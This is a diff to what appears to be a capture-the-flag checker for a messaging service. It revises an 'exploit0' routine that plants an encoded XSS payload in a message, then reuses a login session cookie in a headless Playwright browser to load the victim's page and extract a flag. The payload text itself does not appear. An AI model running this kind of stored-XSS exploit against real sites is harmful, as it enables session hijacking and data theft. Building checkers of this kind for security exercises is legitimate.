@@ -113,7 +113,7 @@ target_url = None
 
 def requestHandler(route):
     global target_url
-    if route.request.resource_type in ['stylesheet', 'font', 'image', 'media'] or not route.request.url.startswith(f"http://{target_url}"):
+    if route.request.resource_type in ['stylesheet', 'font', 'image', 'media', 'script'] or not route.request.url.startswith(f"http://{target_url}"):
         route.abort()
     else:
         route.continue_()
@@ -122,7 +122,7 @@ def requestHandler(route):
 async def retrieve(task, logger, username, password, recipient, start, client):
     if not browsers.get(os.getpid()):
         browsers[os.getpid()] = {"playwright": await async_playwright().start()}
-        browsers[os.getpid()]["browser"] = await browsers[os.getpid()]["playwright"].chromium.launch(headless=True, chromium_sandbox=False)
+        browsers[os.getpid()]["browser"] = await browsers[os.getpid()]["playwright"].chromium.launch(headless=True)
     browser = browsers[os.getpid()]["browser"]
     p = browsers[os.getpid()]["playwright"]
     try:
@@ -511,32 +511,26 @@ async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, clie
     payload = encode(exploitMessage.format(task.address), target, logger)
     r = await client.post(f"{getUrl(task)}/messages/", json={"recipient": target, "message": payload}, cookies=cookie)
     assert_equals(r.status_code, 200, "exploit failed")
-    # event_loop.run_until_complete(xss_test(task, logger))
-    await xss_test(task, logger)
+    await xss_test(task, logger, client)
     flagText = getFlag()
     flag = searcher.search_flag(flagText)
     process.terminate()
     return flag
 
 
-async def xss_test(task, logger):
+async def xss_test(task, logger, client):
     if not browsers.get(os.getpid()):
         browsers[os.getpid()] = {"playwright": await async_playwright().start()}
-        browsers[os.getpid()]["browser"] = await browsers[os.getpid()]["playwright"].chromium.launch()
+        browsers[os.getpid()]["browser"] = await browsers[os.getpid()]["playwright"].chromium.launch(headless=True)
     browser = browsers[os.getpid()]["browser"]
     context = await browser.new_context()
     page = await context.new_page()
+    page.route("**/*", requestHandler)
     try:
-        logger.debug("Logging in as {}".format(json.loads(task.attack_info)['username']))
-        await page.goto(f"{getUrl(task)}/login")
-        # await page.wait_for_load_state("networkidle")
-        await page.fill("#username", json.loads(task.attack_info)['username'])
-        await page.fill("#password", "password")
-        await page.click("input[type=submit]")
-        logger.debug("Going to messages of {}".format(json.loads(task.attack_info)['recipient']))
+        cookies = (await client.post(f"{getUrl(task)}/login", json={"username": json.loads(task.attack_info)['username'], "password": 'password'})).cookies
+        cookie = [{'name': 'session', 'value': cookies['session'], 'domain': task.address, 'path': '/'}]
+        await context.add_cookies(cookie)
         await page.goto(f"{getUrl(task)}/messages/{json.loads(task.attack_info)['recipient']}")
-        logger.debug(await page.content())
-        # await page.wait_for_load_state("networkidle")
     except Exception as e:
         raise (e)
     finally:
